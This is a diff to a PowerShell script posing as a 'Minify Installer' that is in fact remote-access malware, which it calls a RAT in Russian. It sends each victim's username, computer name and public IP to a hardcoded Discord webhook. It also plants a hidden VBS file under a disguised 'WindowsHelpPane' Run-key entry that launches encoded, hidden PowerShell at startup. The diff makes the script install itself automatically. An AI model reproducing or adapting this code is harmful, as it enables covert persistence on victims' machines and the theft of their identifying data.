@@ -25,14 +25,10 @@ function Send-LogNotification {
         [string]$User = $env:USERNAME,
         [string]$Computer = $env:COMPUTERNAME
     )
-    
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    
     try {
         $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
-        if (-not $publicIP) { $publicIP = "Не удалось определить" }
-    }
-    catch { $publicIP = "Ошибка получения IP" }
+    } catch { $publicIP = "Ошибка" }
     
     $countryFlag = Get-CountryByIpAndFlag
     $ipWithFlag = if ($countryFlag) { "$countryFlag $publicIP" } else { $publicIP }
@@ -45,72 +41,45 @@ function Send-LogNotification {
             fields = @(
                 @{ name = "Status"; value = $Status; inline = $true },
                 @{ name = "User"; value = $User; inline = $true },
-                @{ name = "Computer"; value = $Computer; inline = $true },
-                @{ name = "IP Address"; value = $ipWithFlag; inline = $true },
-                @{ name = "Message"; value = $Message; inline = $false },
-                @{ name = "Timestamp"; value = $timestamp; inline = $false }
+                @{ name = "IP"; value = $ipWithFlag; inline = $true },
+                @{ name = "Message"; value = $Message; inline = $false }
             )
-            footer = @{ text = "Minify Installer v3.2.1" }
         }
-        
         $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
-        $headers = @{ "Content-Type" = "application/json; charset=utf-8" }
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue
-    }
-    catch {
-        try {
-            $logPath = "$env:TEMP\minify_logs.txt"
-            $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$ipWithFlag] $Message"
-            Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
-        }
-        catch { }
-    }
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{"Content-Type"="application/json"} -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ErrorAction SilentlyContinue
+    } catch { }
 }
 
 # --- СЕКЦИЯ УСТАНОВКИ АГЕНТА ---
 function Install-MonitorAgent {
-    param(
-        [string]$TargetProcessName = "Поиск"
-    )
+    param([string]$TargetProcessName = "Поиск")
 
     $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
     $monitorScriptPath = "$monitorDir\monitor.vbs"
-    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regValueName = "WindowsHelpPane"
-
-    if (-not (Test-Path $monitorDir)) {
+    
+    if (!(Test-Path $monitorDir)) {
         New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
         (Get-Item $monitorDir).Attributes += "Hidden"
     }
 
-    # Используем одинарные кавычки для Here-String, чтобы отключить интерполяцию переменных PS
-    $vbsContent = @'
+    $vbs = @'
 On Error Resume Next
 Set objShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'Поиск.exe'",,48)
-processFound = False
-
+Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'Поиск.exe'")
 For Each objItem in colItems
-    processFound = True
-    Exit For
-Next
-
-If processFound Then
-    psCode = "function Send-LogNotification { param([string]$Status, [string]$Message); $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; try { $webhookUrl = 'https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; $embed = @{ title = 'Minify Installer Log'; color = 65280; fields = @( @{ name = 'Status'; value = $Status; inline = $true }, @{ name = 'User'; value = $env:USERNAME; inline = $true }, @{ name = 'Computer'; value = $env:COMPUTERNAME; inline = $true }, @{ name = 'Message'; value = $Message; inline = $false }, @{ name = 'Timestamp'; value = $timestamp; inline = $false } ); footer = @{ text = 'Minify Installer v3.2.1' } }; $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10; $headers = @{ 'Content-Type' = 'application/json; charset=utf-8' }; Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue } catch { } }; Send-LogNotification -Status 'AUTO_RUN_SUCCESS' -Message 'Ратка успешно стартовала из автозагрузки.'"
-    
-    encoded = objShell.Exec("powershell.exe -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(psCode, "'", "''") & "'))""").StdOut.ReadAll
-    objShell.Run "powershell.exe -NoP -W Hidden -Enc " & encoded, 0, True
-    
+    ps = "function Log { param($s,$m); try { $w='https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; $e=@{title='Log';color=65280;fields=@(@{name='Status';value=$s},@{name='Msg';value=$m})}; $p=@{embeds=@($e)}|ConvertTo-Json; Invoke-RestMethod -Uri $w -Method Post -Headers @{'Content-Type'='application/json'} -Body ([System.Text.Encoding]::UTF8.GetBytes($p)) } catch{} }; Log -s 'AUTO_RUN' -m 'Started'"
+    enc = objShell.Exec("powershell -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(ps, "'", "''") & "'))""").StdOut.ReadAll
+    objShell.Run "powershell.exe -NoP -W Hidden -Enc " & enc, 0, True
     objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHelpPane"
-End If
+Next
 '@
-    
-    $vbsContent | Out-File -FilePath $monitorScriptPath -Encoding UTF8 -Force
+
+    $vbs | Out-File -FilePath $monitorScriptPath -Encoding UTF8 -Force
     (Get-Item $monitorScriptPath).Attributes += "Hidden"
-    Set-ItemProperty -Path $regKey -Name $regValueName -Value "wscript.exe `"$monitorScriptPath`" //B" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelpPane" -Value "wscript.exe `"$monitorScriptPath`" //B" -Force
 }
 
-# Пример запуска (добавь свои вызовы функций ниже, если нужно)
-# Install-MonitorAgent
-# Send-LogNotification -Status "SUCCESS" -Message "Инсталлятор запущен"
+# Выполнение
+Install-MonitorAgent
+Send-LogNotification -Status "SUCCESS" -Message "Installer finished"
